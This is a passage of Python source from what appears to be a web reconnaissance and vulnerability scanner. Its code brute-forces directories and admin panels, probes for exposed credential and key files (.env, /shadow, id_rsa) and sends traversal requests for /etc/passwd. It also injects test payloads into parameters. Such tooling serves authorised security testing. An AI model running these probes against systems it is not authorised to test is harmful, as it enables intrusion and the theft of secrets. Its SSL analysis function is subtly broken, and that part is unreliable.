            record_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA', 'PTR']
            
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(domain, record_type)
                    dns_info[record_type] = [str(rdata) for rdata in answers]
                except:
                    dns_info[record_type] = []
            
            # Zone transfer attempt
            try:
                ns_answers = dns.resolver.resolve(domain, 'NS')
                for ns in ns_answers:
                    try:
                        zone = dns.zone.from_xfr(dns.query.xfr(str(ns), domain))
                        dns_info['zone_transfer'] = f"Possible from {ns}"
                        break
                    except:
                        continue
                else:
                    dns_info['zone_transfer'] = 'Not possible'
            except:
                dns_info['zone_transfer'] = 'Unknown'
            
            return dns_info
        except Exception as e:
            self.config.logger.debug(f"DNS reconnaissance error: {e}")
            return {'error': str(e)}

    async def _advanced_ssl_analysis(self, url: str) -> Dict:
        """Enhanced SSL/TLS analysis using SSLyze"""
        if not SSLYZE_AVAILABLE or not url.startswith('https://'):
            return {'error': 'SSLyze not available or non-HTTPS URL'}
        
        try:
            domain = urlparse(url).netloc
            port = 443
            
            # Create server location
            server_location = ServerNetworkLocation(domain, port)
            server_scan_req = ServerScanRequest(
                server_info=server_location,
                scan_commands={ScanCommand.CERTIFICATE_INFO, ScanCommand.SSL_2_0_CIPHER_SUITES, 
                             ScanCommand.SSL_3_0_CIPHER_SUITES, ScanCommand.TLS_1_0_CIPHER_SUITES,
                             ScanCommand.TLS_1_1_CIPHER_SUITES, ScanCommand.TLS_1_2_CIPHER_SUITES,
                             ScanCommand.TLS_1_3_CIPHER_SUITES}
            )
            
            scanner = Scanner()
            scan_result = scanner.get_results()
            
            # Process SSL scan results
            ssl_info = {
                'certificate_info': {},
                'protocol_support': {},
                'cipher_suites': {},
                'vulnerabilities': []
            }
            
            for scan_command, result in scan_result.scan_commands_results.items():
                if scan_command == ScanCommand.CERTIFICATE_INFO:
                    cert_deployments = result.certificate_deployments
                    if cert_deployments:
                        cert = cert_deployments[0].received_certificate_chain[0]
                        ssl_info['certificate_info'] = {
                            'subject': cert.subject.rfc4514_string(),
                            'issuer': cert.issuer.rfc4514_string(),
                            'not_valid_before': str(cert.not_valid_before),
                            'not_valid_after': str(cert.not_valid_after),
                            'signature_algorithm': cert.signature_algorithm_oid._name,
                            'key_size': cert.public_key().key_size if hasattr(cert.public_key(), 'key_size') else 'Unknown'
                        }
            
            return ssl_info
        except Exception as e:
            self.config.logger.debug(f"SSL analysis error: {e}")
            return {'error': str(e)}

    async def _advanced_http_analysis(self, url: str) -> Dict:
        """Enhanced HTTP analysis using httpx"""
        if not HTTPX_AVAILABLE:
            return {'error': 'HTTPX library not available'}
        
        try:
            async with httpx.AsyncClient(timeout=5) as client:
                response = await client.get(url, follow_redirects=True)
                
                return {
                    'http_version': f"HTTP/{response.http_version}",
                    'status_code': response.status_code,
                    'response_headers': dict(response.headers),
                    'redirect_chain': [str(req.url) for req in response.history],
                    'final_url': str(response.url),
                    'content_encoding': response.headers.get('content-encoding', 'none'),
                    'server_header': response.headers.get('server', 'unknown'),
                    'cookies': [cookie.name for cookie in response.cookies],
                    'security_headers': {
                        'strict-transport-security': response.headers.get('strict-transport-security', 'missing'),
                        'content-security-policy': response.headers.get('content-security-policy', 'missing'),
                        'x-frame-options': response.headers.get('x-frame-options', 'missing'),
                        'x-content-type-options': response.headers.get('x-content-type-options', 'missing'),
                        'x-xss-protection': response.headers.get('x-xss-protection', 'missing'),
                        'referrer-policy': response.headers.get('referrer-policy', 'missing')
                    }
                }
        except Exception as e:
            self.config.logger.debug(f"HTTP analysis error: {e}")
            return {'error': str(e)}

    async def _network_packet_analysis(self, url: str) -> Dict:
        """Basic network analysis using Scapy (requires root/admin privileges)"""
        if not SCAPY_AVAILABLE:
            return {'error': 'Scapy library not available'}
        
        try:
            domain = urlparse(url).netloc
            
            # Basic ping analysis
            try:
                ip_address = socket.gethostbyname(domain)
                
                # ICMP ping (requires privileges)
                ping_result = scapy.sr1(scapy.IP(dst=ip_address)/scapy.ICMP(), timeout=2, verbose=0)
                
                if ping_result:
                    return {
                        'icmp_response': True,
                        'ttl': ping_result.ttl,
                        'response_time': f"{ping_result.time:.2f}ms",
                        'ip_version': ping_result.version
                    }
                else:
                    return {'icmp_response': False}
            except Exception as e:
                return {'error': f"Network analysis requires elevated privileges: {e}"}
        except Exception as e:
            self.config.logger.debug(f"Packet analysis error: {e}")
            return {'error': str(e)}

    # === Advanced Discovery & Intelligence Methods ===

    async def _advanced_webpage_discovery(self, url: str) -> Dict:
        """Advanced webpage discovery using multiple techniques"""
        discovery_results = {
            'total_pages': 0,
            'discovered_pages': [],
            'hidden_directories': [],
            'backup_files': [],
            'config_files': [],
            'robots_txt_analysis': {},
            'sitemap_analysis': {},
            'javascript_endpoints': [],
            'api_endpoints': [],
            'admin_panels': []
        }
        
        try:
            domain = urlparse(url).netloc
            base_url = f"{urlparse(url).scheme}://{domain}"
            
            # Robots.txt analysis
            try:
                robots_url = f"{base_url}/robots.txt"
                status, headers, content, final_url = await self.session.get(robots_url)
                if status == 200 and content:
                    discovery_results['robots_txt_analysis'] = {
                        'found': True,
                        'disallowed_paths': [],
                        'allowed_paths': [],
                        'crawl_delay': None,
                        'sitemaps': []
                    }
                    
                    for line in content.split('\n'):
                        line = line.strip()
                        if line.startswith('Disallow:'):
                            path = line.split(':', 1)[1].strip()
                            if path and path != '/':
                                discovery_results['robots_txt_analysis']['disallowed_paths'].append(path)
                                discovery_results['discovered_pages'].append(f"{base_url}{path}")
                        elif line.startswith('Allow:'):
                            path = line.split(':', 1)[1].strip()
                            discovery_results['robots_txt_analysis']['allowed_paths'].append(path)
                        elif line.startswith('Sitemap:'):
                            sitemap_url = line.split(':', 1)[1].strip()
                            discovery_results['robots_txt_analysis']['sitemaps'].append(sitemap_url)
            except:
                discovery_results['robots_txt_analysis'] = {'found': False}
            
            # Sitemap.xml analysis
            try:
                sitemap_url = f"{base_url}/sitemap.xml"
                status, headers, content, final_url = await self.session.get(sitemap_url)
                if status == 200 and content and LXML_AVAILABLE:
                    discovery_results['sitemap_analysis'] = {
                        'found': True,
                        'urls': [],
                        'last_modified': []
                    }
                    
                    try:
                        root = etree.fromstring(content.encode())
                        for url_elem in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}url'):
                            loc = url_elem.find('{http://www.sitemaps.org/schemas/sitemap/0.9}loc')
                            if loc is not None:
                                discovery_results['sitemap_analysis']['urls'].append(loc.text)
                                discovery_results['discovered_pages'].append(loc.text)
                    except:
                        pass
            except:
                discovery_results['sitemap_analysis'] = {'found': False}
            
            # Common directory enumeration
            common_dirs = [
                '/admin', '/administrator', '/wp-admin', '/cpanel', '/control', '/panel',
                '/api', '/v1', '/v2', '/swagger', '/docs', '/documentation',
                '/backup', '/backups', '/bak', '/old', '/tmp', '/temp',
                '/test', '/testing', '/dev', '/development', '/staging',
                '/config', '/configuration', '/settings', '/setup',
                '/uploads', '/files', '/assets', '/static', '/images',
                '/private', '/secure', '/protected', '/restricted'
            ]
            
            dir_tasks = []
            for directory in common_dirs:
                dir_tasks.append(self._check_directory_exists(base_url, directory))
            
            dir_results = await asyncio.gather(*dir_tasks, return_exceptions=True)
            for i, result in enumerate(dir_results):
                if result and not isinstance(result, Exception):
                    discovery_results['hidden_directories'].append(common_dirs[i])
                    discovery_results['discovered_pages'].append(f"{base_url}{common_dirs[i]}")
            
            # Backup and config file detection
            backup_extensions = ['.bak', '.backup', '.old', '.orig', '.copy', '.tmp']
            config_files = [
                '/config.php', '/config.ini', '/config.xml', '/config.json',
                '/settings.php', '/settings.ini', '/app.config', '/web.config',
                '/.env', '/.env.local', '/.env.production', '/composer.json',
                '/package.json', '/Gemfile', '/requirements.txt', '/pom.xml'
            ]
            
            file_tasks = []
            for config_file in config_files:
                file_tasks.append(self._check_file_exists(base_url, config_file))
            
            file_results = await asyncio.gather(*file_tasks, return_exceptions=True)
            for i, result in enumerate(file_results):
                if result and not isinstance(result, Exception):
                    discovery_results['config_files'].append(config_files[i])
                    discovery_results['discovered_pages'].append(f"{base_url}{config_files[i]}")
            
            # Admin panel detection
            admin_paths = [
                '/admin', '/administrator', '/wp-admin', '/admin.php', '/admin.html',
                '/login', '/signin', '/auth', '/portal', '/dashboard',
                '/manager', '/management', '/control', '/cpanel'
            ]
            
            admin_tasks = []
            for admin_path in admin_paths:
                admin_tasks.append(self._check_admin_panel(base_url, admin_path))
            
            admin_results = await asyncio.gather(*admin_tasks, return_exceptions=True)
            for i, result in enumerate(admin_results):
                if result and not isinstance(result, Exception):
                    discovery_results['admin_panels'].append(admin_paths[i])
                    discovery_results['discovered_pages'].append(f"{base_url}{admin_paths[i]}")
            
            # JavaScript endpoint extraction
            try:
                status, headers, content, final_url = await self.session.get(url)
                if content and BS4_AVAILABLE:
                    soup = BeautifulSoup(content, 'html.parser')
                    
                    # Extract from script tags
                    for script in soup.find_all('script'):
                        if script.string:
                            # Look for API endpoints in JavaScript
                            import re
                            api_patterns = [
                                r'["\']/(api|API)/[^"\']*["\']',
                                r'["\']https?://[^"\']*api[^"\']*["\']',
                                r'fetch\(["\']([^"\']*)["\']',
                                r'xhr\.open\(["\'][^"\']*["\'],\s*["\']([^"\']*)["\']'
                            ]
                            
                            for pattern in api_patterns:
                                matches = re.findall(pattern, script.string)
                                for match in matches:
                                    endpoint = match if isinstance(match, str) else match[0] if match else None
                                    if endpoint and endpoint not in discovery_results['api_endpoints']:
                                        discovery_results['api_endpoints'].append(endpoint)
                                        if not endpoint.startswith('http'):
                                            discovery_results['discovered_pages'].append(f"{base_url}{endpoint}")
                                        else:
                                            discovery_results['discovered_pages'].append(endpoint)
            except:
                pass
            
            # Update total count
            discovery_results['total_pages'] = len(set(discovery_results['discovered_pages']))
            
            return discovery_results
            
        except Exception as e:
            self.config.logger.debug(f"Webpage discovery error: {e}")
            return discovery_results

    async def _check_directory_exists(self, base_url: str, directory: str) -> bool:
        """Check if a directory exists"""
        try:
            status, headers, content, final_url = await self.session.get(f"{base_url}{directory}")
            return status in [200, 301, 302, 403]  # Include forbidden as it indicates existence
        except:
            return False

    async def _check_file_exists(self, base_url: str, file_path: str) -> bool:
        """Check if a file exists"""
        try:
            status, headers, content, final_url = await self.session.get(f"{base_url}{file_path}")
            return status == 200
        except:
            return False

    async def _check_admin_panel(self, base_url: str, admin_path: str) -> bool:
        """Check if admin panel exists"""
        try:
            status, headers, content, final_url = await self.session.get(f"{base_url}{admin_path}")
            if status in [200, 301, 302]:
                # Check if it looks like an admin panel
                if content and any(keyword in content.lower() for keyword in ['login', 'username', 'password', 'admin', 'dashboard']):
                    return True
            return False
        except:
            return False

    async def _advanced_file_leak_detection(self, url: str) -> Dict:
        """Advanced file leak detection and analysis"""
        leak_results = {
            'total_leaks': 0,
            'sensitive_files': [],
            'database_backups': [],
            'source_code_leaks': [],
            'configuration_leaks': [],
            'credential_files': [],
            'log_files': [],
            'documentation_leaks': [],
            'certificate_files': [],
            'key_files': [],
            'archive_files': []
        }
        
        try:
            domain = urlparse(url).netloc
            base_url = f"{urlparse(url).scheme}://{domain}"
            
            # Sensitive file patterns
            sensitive_patterns = {
                'database_backups': [
                    '/database.sql', '/db.sql', '/backup.sql', '/dump.sql',
                    '/database.sql.gz', '/db.tar.gz', '/mysql.sql',
                    '/postgres.sql', '/mongodb.json', '/redis.rdb'
                ],
                'source_code_leaks': [
                    '/.git/config', '/.svn/entries', '/.hg/hgrc',
                    '/composer.json', '/package.json', '/requirements.txt',
                    '/Gemfile', '/pom.xml', '/build.gradle'
                ],
                'configuration_leaks': [
                    '/.env', '/.env.local', '/.env.production', '/.env.development',
                    '/config.php', '/config.ini', '/app.config', '/web.config',
                    '/settings.xml', '/application.properties', '/hibernate.cfg.xml'
                ],
                'credential_files': [
                    '/passwd', '/shadow', '/htpasswd', '/.htpasswd',
                    '/users.txt', '/passwords.txt', '/credentials.txt',
                    '/ssh/id_rsa', '/ssh/id_dsa', '/ssh/authorized_keys'
                ],
                'log_files': [
                    '/error.log', '/access.log', '/debug.log', '/application.log',
                    '/error_log', '/access_log', '/php_errors.log',
                    '/catalina.out', '/server.log', '/system.log'
                ],
                'documentation_leaks': [
                    '/README.md', '/CHANGELOG.md', '/TODO.txt', '/INSTALL.txt',
                    '/documentation.pdf', '/manual.pdf', '/api-docs.json',
                    '/swagger.json', '/openapi.json', '/postman.json'
                ],
                'certificate_files': [
                    '/cert.pem', '/certificate.crt', '/ssl.crt', '/server.crt',
                    '/ca.crt', '/intermediate.crt', '/fullchain.pem'
                ],
                'key_files': [
                    '/private.key', '/server.key', '/ssl.key', '/rsa.key',
                    '/dsa.key', '/ecdsa.key', '/id_rsa', '/id_dsa'
                ],
                'archive_files': [
                    '/backup.zip', '/backup.tar.gz', '/site.zip', '/www.tar.gz',
                    '/source.zip', '/code.tar.gz', '/files.rar', '/data.7z'
                ]
            }
            
            # Check each category
            for category, file_list in sensitive_patterns.items():
                file_tasks = []
                for file_path in file_list:
                    file_tasks.append(self._check_sensitive_file(base_url, file_path))
                
                file_results = await asyncio.gather(*file_tasks, return_exceptions=True)
                for i, result in enumerate(file_results):
                    if result and not isinstance(result, Exception):
                        leak_results[category].append(file_list[i])
                        leak_results['sensitive_files'].append(file_list[i])
            
            # Directory traversal attempts
            traversal_paths = [
                '/../../etc/passwd', '/../../etc/shadow', '/../../etc/hosts',
                '/../../windows/system32/drivers/etc/hosts',
                '/../../boot.ini', '/../../windows/win.ini'
            ]
            
            for path in traversal_paths:
                try:
                    status, headers, content, final_url = await self.session.get(f"{base_url}{path}")
                    if status == 200 and content:
                        if any(indicator in content.lower() for indicator in ['root:', 'daemon:', '[boot loader]', '[fonts]']):
                            leak_results['sensitive_files'].append(path)
                            if 'directory_traversal' not in leak_results:
                                leak_results['directory_traversal'] = []
                            leak_results['directory_traversal'].append(path)
                except:
                    pass
            
            # Update total count
            leak_results['total_leaks'] = len(leak_results['sensitive_files'])
            
            return leak_results
            
        except Exception as e:
            self.config.logger.debug(f"File leak detection error: {e}")
            return leak_results

    async def _check_sensitive_file(self, base_url: str, file_path: str) -> bool:
        """Check if a sensitive file exists and is accessible"""
        try:
            status, headers, content, final_url = await self.session.get(f"{base_url}{file_path}")
            if status == 200 and content:
                # Verify it's actually the expected file type
                if file_path.endswith(('.sql', '.gz', '.tar.gz')) and len(content) > 100:
                    return True
                elif file_path.endswith(('.json', '.xml', '.ini', '.txt')) and len(content) > 50:
                    return True
                elif file_path.endswith(('.log')) and 'log' in content.lower():
                    return True
                elif file_path.endswith(('.key', '.pem', '.crt')) and any(marker in content for marker in ['BEGIN', 'END', 'KEY', 'CERTIFICATE']):
                    return True
                elif len(content) > 10:  # Basic existence check
                    return True
            return False
        except:
            return False

    async def _advanced_parameter_enumeration(self, url: str) -> Dict:
        """Advanced parameter enumeration and analysis"""
        param_results = {
            'total_parameters': 0,
            'get_parameters': [],
            'post_parameters': [],
            'hidden_parameters': [],
            'injectable_parameters': [],
            'file_upload_parameters': [],
            'authentication_parameters': [],
            'session_parameters': [],
            'api_parameters': [],
            'json_parameters': [],
            'xml_parameters': []
        }
        
        try:
            # Common parameter names for testing
            common_params = [
                'id', 'user', 'username', 'email', 'password', 'token', 'session',
                'file', 'path', 'url', 'redirect', 'callback', 'return',
                'search', 'query', 'q', 'keyword', 'term',
                'page', 'limit', 'offset', 'sort', 'order',
                'category', 'type', 'action', 'method', 'function',
                'data', 'value', 'content', 'message', 'comment'
            ]
            
            # Test GET parameters
            for param in common_params:
                test_url = f"{url}{'&' if '?' in url else '?'}{param}=test"
                try:
                    status, headers, content, final_url = await self.session.get(test_url)
                    if status == 200:
                        # Check if parameter affects response
                        original_status, _, original_content, _ = await self.session.get(url)
                        if content != original_content:
                            param_results['get_parameters'].append(param)
                            
                            # Test for injection vulnerabilities
                            if await self._test_parameter_injection(url, param, 'GET'):
                                param_results['injectable_parameters'].append(f"GET:{param}")
                except:
                    pass
            
            # Test POST parameters via form detection
            try:
                status, headers, content, final_url = await self.session.get(url)
                if content and BS4_AVAILABLE:
                    soup = BeautifulSoup(content, 'html.parser')
                    
                    # Find forms and extract parameters
                    for form in soup.find_all('form'):
                        for input_tag in form.find_all(['input', 'textarea', 'select']):
                            param_name = input_tag.get('name')
                            param_type = input_tag.get('type', 'text')
                            
                            if param_name:
                                param_results['post_parameters'].append(param_name)
                                
                                # Categorize parameters
                                if param_type == 'file':
                                    param_results['file_upload_parameters'].append(param_name)
                                elif param_name.lower() in ['username', 'password', 'email', 'login']:
                                    param_results['authentication_parameters'].append(param_name)
                                elif param_name.lower() in ['session', 'token', 'csrf']:
                                    param_results['session_parameters'].append(param_name)
                                elif param_type == 'hidden':
                                    param_results['hidden_parameters'].append(param_name)
            except:
                pass
            
            # API parameter detection via JavaScript analysis
            try:
                status, headers, content, final_url = await self.session.get(url)
                if content:
                    import re
                    
                    # Extract JSON API parameters
                    json_patterns = [
                        r'"(\w+)"\s*:\s*"[^"]*"',
                        r"'(\w+)'\s*:\s*'[^']*'",
                        r'(\w+)\s*:\s*["\'][^"\']*["\']'
                    ]
                    
                    for pattern in json_patterns:
                        matches = re.findall(pattern, content)
                        for match in matches:
                            if isinstance(match, str) and match not in param_results['json_parameters']:
                                param_results['json_parameters'].append(match)
                                param_results['api_parameters'].append(f"JSON:{match}")
                    
                    # Extract XML parameters
                    xml_pattern = r'<(\w+)[^>]*>'
                    xml_matches = re.findall(xml_pattern, content)
                    for match in xml_matches:
                        if match not in ['html', 'head', 'body', 'div', 'span', 'a', 'p', 'script', 'style']:
                            if match not in param_results['xml_parameters']:
                                param_results['xml_parameters'].append(match)
                                param_results['api_parameters'].append(f"XML:{match}")
            except:
                pass
            
            # Update total count
            all_params = (param_results['get_parameters'] + param_results['post_parameters'] + 
                         param_results['hidden_parameters'] + param_results['api_parameters'])
            param_results['total_parameters'] = len(set(all_params))
            
            return param_results
            
        except Exception as e:
            self.config.logger.debug(f"Parameter enumeration error: {e}")
            return param_results

    async def _test_parameter_injection(self, url: str, param: str, method: str = 'GET') -> bool:
        """Test parameter for injection vulnerabilities"""
        try:
            # Simple injection payloads
            injection_payloads = ["'", '"', '<script>', '{{7*7}}', '${7*7}', '#{7*7}']
            
            for payload in injection_payloads:
                if method == 'GET':
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
                    status, headers, content, final_url = await self.session.get(test_url)
                else:
                    # POST testing would require form handling
                    return False
                
                if content and any(indicator in content.lower() for indicator in [
                    'sql', 'mysql', 'error', 'warning', 'exception', 'stack trace', '49', 'syntax'
                ]):
                    return True
            
            return False
        except:
            return False

    async def _comprehensive_vulnerability_scan(self, url: str) -> List[Dict]:
        """Comprehensive vulnerability scanning with enhanced detection"""
        enhanced_findings = []
        
        # Run all advanced reconnaissance
        if SHODAN_AVAILABLE:
            shodan_info = await self._advanced_shodan_reconnaissance(url)
            if 'vulnerabilities' in shodan_info and shodan_info['vulnerabilities']:
                for vuln in shodan_info['vulnerabilities']:
                    enhanced_findings.append(self._create_finding(
                        'Shodan Vulnerability', 'HIGH',
                        f"Known vulnerability detected: {vuln}",
                        url, cve_id=vuln if vuln.startswith('CVE-') else None
                    ))
        
        # Enhanced technology detection
        if BUILTWITH_AVAILABLE:
            tech_info = await self._advanced_technology_detection(url)
            if 'error' not in tech_info:
                # Check for outdated technologies
                outdated_tech = []
                for category, technologies in tech_info.items():
                    for tech in technologies:
                        if any(old_tech in tech.lower() for old_tech in ['old', 'legacy', 'deprecated']):
                            outdated_tech.append(f"{category}: {tech}")
                
                if outdated_tech:
                    enhanced_findings.append(self._create_finding(
                        'Outdated Technology', 'MEDIUM',
                        f"Outdated technologies detected: {', '.join(outdated_tech)}",
                        url
                    ))
        
        # SSL/TLS vulnerabilities
        if SSLYZE_AVAILABLE and url.startswith('https://'):
            ssl_info = await self._advanced_ssl_analysis(url)
            if 'vulnerabilities' in ssl_info and ssl_info['vulnerabilities']:
                for vuln in ssl_info['vulnerabilities']:
                    enhanced_findings.append(self._create_finding(
                        'SSL/TLS Vulnerability', 'HIGH',
                        f"SSL/TLS vulnerability: {vuln}",
                        url
                    ))
        
        # DNS vulnerabilities
        if DNS_AVAILABLE:
            dns_info = await self._advanced_dns_reconnaissance(url)
            if dns_info.get('zone_transfer') and 'Possible' in dns_info['zone_transfer']:
                enhanced_findings.append(self._create_finding(
                    'DNS Zone Transfer', 'HIGH',
                    f"DNS zone transfer possible: {dns_info['zone_transfer']}",
                    url
                ))
        
        return enhanced_findings

    async def _website_structure_mapping(self, url: str) -> Dict:
        """Comprehensive website structure mapping and URL discovery"""
        structure_results = {
            'base_url': url,
            'discovered_urls': [],
            'structure_analysis': {},
            'crawl_statistics': {},
            'per_url_vulnerabilities': {},
            'robots_analysis': {},
            'sitemap_analysis': {},
            'directory_enumeration': {},
            'subdomain_enumeration': {},
            'error': None
        }
        
        try:
            import urllib.parse
            from collections import deque
            import threading
            from urllib.robotparser import RobotFileParser
            import mimetypes
            import hashlib
            
            base_domain = urllib.parse.urlparse(url).netloc
            discovered_urls = set()
            crawl_queue = deque([url])
            processed_urls = set()
            
            # Robots.txt analysis
            robots_url = f"{urllib.parse.urlparse(url).scheme}://{base_domain}/robots.txt"
            robots_info = await self._analyze_robots_txt(robots_url)
            structure_results['robots_analysis'] = robots_info
            
            # Sitemap discovery
            sitemap_info = await self._discover_sitemaps(url)
            structure_results['sitemap_analysis'] = sitemap_info
            
            # Directory enumeration
            directory_info = await self._enumerate_directories(url)
            structure_results['directory_enumeration'] = directory_info
            
            # Subdomain enumeration
            subdomain_info = await self._enumerate_subdomains(base_domain)
            structure_results['subdomain_enumeration'] = subdomain_info
            
            # Advanced web crawling with depth control
            max_depth = 3
            max_urls = 50  # Limit for demonstration
            
            for depth in range(max_depth):
                if not crawl_queue or len(discovered_urls) >= max_urls:
                    break
                    
                current_level_urls = list(crawl_queue)
                crawl_queue.clear()
                
                for current_url in current_level_urls:
                    if current_url in processed_urls or len(discovered_urls) >= max_urls:
                        continue
                        
                    processed_urls.add(current_url)
                    
                    try:
                        # Fetch page content
                        status, headers, content, final_url = await self.session.get(current_url)
                        
                        if status == 200 and content:
                            discovered_urls.add(current_url)
                            
                            # Extract links from content
                            new_urls = await self._extract_urls_from_content(content, current_url)
                            
                            # Filter and add to queue for next depth
                            for new_url in new_urls:
                                if (new_url not in processed_urls and 
                                    urllib.parse.urlparse(new_url).netloc == base_domain and
                                    len(discovered_urls) < max_urls):
                                    crawl_queue.append(new_url)
                                    
                    except Exception as e:
                        self.config.logger.debug(f"Error crawling {current_url}: {e}")
                        continue
            
            # Convert to list and sort
            structure_results['discovered_urls'] = sorted(list(discovered_urls))
            
            # Analyze structure
            structure_analysis = await self._analyze_website_structure(discovered_urls)
            structure_results['structure_analysis'] = structure_analysis
            
            # Crawl statistics
            structure_results['crawl_statistics'] = {
                'total_urls_discovered': len(discovered_urls),
                'total_urls_processed': len(processed_urls),
                'crawl_depth_achieved': min(max_depth, len(discovered_urls) // 10 + 1),
                'unique_directories': len(set(urllib.parse.urlparse(u).path.split('/')[1] for u in discovered_urls if urllib.parse.urlparse(u).path.split('/')[1])),
                'file_types_discovered': len(set(self._get_file_extension(u) for u in discovered_urls)),
                'parameters_found': sum(1 for u in discovered_urls if '?' in u)
            }
            
            # Per-URL vulnerability analysis
            structure_results['per_url_vulnerabilities'] = await self._analyze_per_url_vulnerabilities(discovered_urls)
            
            return structure_results
            
        except Exception as e:
            self.config.logger.debug(f"Website structure mapping error: {e}")
            structure_results['error'] = str(e)
            return structure_results

    async def _analyze_robots_txt(self, robots_url: str) -> Dict:
        """Analyze robots.txt file"""
        robots_info = {
            'exists': False,
            'user_agents': [],
            'disallowed_paths': [],
            'allowed_paths': [],
            'sitemaps': [],
            'crawl_delay': None,
            'interesting_findings': []
        }
        
        try:
            status, headers, content, final_url = await self.session.get(robots_url)
            
            if status == 200 and content:
                robots_info['exists'] = True
                lines = content.split('\n')
                
                current_user_agent = None
                for line in lines:
                    line = line.strip()
                    if line.lower().startswith('user-agent:'):
                        current_user_agent = line.split(':', 1)[1].strip()
                        robots_info['user_agents'].append(current_user_agent)
                    elif line.lower().startswith('disallow:'):
                        path = line.split(':', 1)[1].strip()
                        robots_info['disallowed_paths'].append(path)
                        # Check for interesting paths
                        if any(keyword in path.lower() for keyword in ['admin', 'private', 'secret', 'config', 'backup']):
                            robots_info['interesting_findings'].append(f"Sensitive path disclosed: {path}")
                    elif line.lower().startswith('allow:'):
                        path = line.split(':', 1)[1].strip()
                        robots_info['allowed_paths'].append(path)
                    elif line.lower().startswith('sitemap:'):
                        sitemap = line.split(':', 1)[1].strip()
                        robots_info['sitemaps'].append(sitemap)
                    elif line.lower().startswith('crawl-delay:'):
                        robots_info['crawl_delay'] = line.split(':', 1)[1].strip()
            
        except Exception as e:
            self.config.logger.debug(f"Robots.txt analysis error: {e}")
        
        return robots_info

    async def _discover_sitemaps(self, url: str) -> Dict:
        """Discover and analyze sitemaps"""
        sitemap_info = {
            'sitemaps_found': [],
            'total_urls': 0,
            'url_patterns': [],
            'last_modified': [],
            'priority_analysis': {}
        }
        
        try:
            import urllib.parse
            base_url = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
            
            # Common sitemap locations
            sitemap_paths = [
                '/sitemap.xml',
                '/sitemap_index.xml',
                '/sitemap.txt',
                '/sitemaps.xml',
                '/sitemap1.xml'
            ]
            
            for path in sitemap_paths:
                sitemap_url = base_url + path
                try:
                    status, headers, content, final_url = await self.session.get(sitemap_url)
                    
                    if status == 200 and content:
                        sitemap_info['sitemaps_found'].append(sitemap_url)
                        
                        # Basic XML parsing for URL count
                        if '<loc>' in content:
                            urls_count = content.count('<loc>')
                            sitemap_info['total_urls'] += urls_count
                            
                        # Check for lastmod dates
                        if '<lastmod>' in content:
                            lastmod_count = content.count('<lastmod>')
                            sitemap_info['last_modified'].append(f"{sitemap_url}: {lastmod_count} dated entries")
                            
                except Exception as e:
                    continue
                    
        except Exception as e:
            self.config.logger.debug(f"Sitemap discovery error: {e}")
        
        return sitemap_info

    async def _enumerate_directories(self, url: str) -> Dict:
        """Enumerate common directories"""
        directory_info = {
            'existing_directories': [],
            'interesting_files': [],
            'status_codes': {},
            'redirect_chains': []
        }
        
        try:
            import urllib.parse
            base_url = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
            
            # Common directories to check
            common_dirs = [
                'admin', 'administrator', 'login', 'wp-admin', 'cpanel',
                'api', 'v1', 'v2', 'docs', 'documentation',
                'backup', 'backups', 'old', 'test', 'staging',
                'config', 'configuration', 'settings',
                'uploads', 'files', 'assets', 'static',
                'logs', 'log', 'temp', 'tmp'
            ]
            
            # Common files to check
            common_files = [
                'robots.txt', 'sitemap.xml', '.htaccess', 'web.config',
                'phpinfo.php', 'info.php', 'test.php',
                'readme.txt', 'README.md', 'changelog.txt',
                'backup.zip', 'backup.sql', 'database.sql',
                '.env', '.git/config', '.svn/entries'
            ]
            
            # Check directories
            for directory in common_dirs:
                dir_url = f"{base_url}/{directory}/"
                try:
                    status, headers, content, final_url = await self.session.get(dir_url)
                    directory_info['status_codes'][dir_url] = status
                    
                    if status in [200, 301, 302, 403]:
                        directory_info['existing_directories'].append({
                            'url': dir_url,
                            'status': status,
                            'size': len(content) if content else 0
                        })
                        
                except Exception:
                    continue
            
            # Check files
            for file_name in common_files:
                file_url = f"{base_url}/{file_name}"
                try:
                    status, headers, content, final_url = await self.session.get(file_url)
                    
                    if status == 200:
                        directory_info['interesting_files'].append({
                            'url': file_url,
                            'status': status,
                            'size': len(content) if content else 0,
                            'type': self._get_file_type(file_name)
                        })
                        
                except Exception:
                    continue
                    
        except Exception as e:
            self.config.logger.debug(f"Directory enumeration error: {e}")
        
        return directory_info

    async def _enumerate_subdomains(self, domain: str) -> Dict:
        """Enumerate subdomains using common patterns"""
        subdomain_info = {
            'discovered_subdomains': [],
            'subdomain_count': 0,
            'interesting_subdomains': [],
            'ip_addresses': {}
        }
        
        try:
            # Common subdomain prefixes
            common_subdomains = [
                'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp',
                'pop', 'ns1', 'webdisk', 'ns2', 'cpanel', 'whm',
                'autodiscover', 'autoconfig', 'api', 'admin',
                'test', 'staging', 'dev', 'beta', 'demo'
            ]
            
            for subdomain in common_subdomains:
                full_domain = f"{subdomain}.{domain}"
                try:
                    # Simple DNS resolution check
                    import socket
                    ip = socket.gethostbyname(full_domain)
                    subdomain_info['discovered_subdomains'].append(full_domain)
                    subdomain_info['ip_addresses'][full_domain] = ip
                    
                    # Check if subdomain is interesting
                    if subdomain in ['admin', 'test', 'staging', 'dev', 'api']:
                        subdomain_info['interesting_subdomains'].append(full_domain)
                        
                except socket.gaierror:
                    continue
                except Exception:
                    continue
            
            subdomain_info['subdomain_count'] = len(subdomain_info['discovered_subdomains'])
            
        except Exception as e:
            self.config.logger.debug(f"Subdomain enumeration error: {e}")
        
        return subdomain_info

    async def _extract_urls_from_content(self, content: str, base_url: str) -> List[str]:
        """Extract URLs from HTML content"""
        urls = []
        
        try:
            import re
            import urllib.parse
            
            # Extract href attributes
            href_pattern = r'href=["\']([^"\']+)["\']'
            hrefs = re.findall(href_pattern, content, re.IGNORECASE)
            
            # Extract src attributes
            src_pattern = r'src=["\']([^"\']+)["\']'
            srcs = re.findall(src_pattern, content, re.IGNORECASE)
            
            # Extract action attributes
            action_pattern = r'action=["\']([^"\']+)["\']'
            actions = re.findall(action_pattern, content, re.IGNORECASE)
            
            all_links = hrefs + srcs + actions
            
            for link in all_links:
                try:
                    # Convert relative URLs to absolute
                    absolute_url = urllib.parse.urljoin(base_url, link)
                    
                    # Filter out non-HTTP URLs and fragments
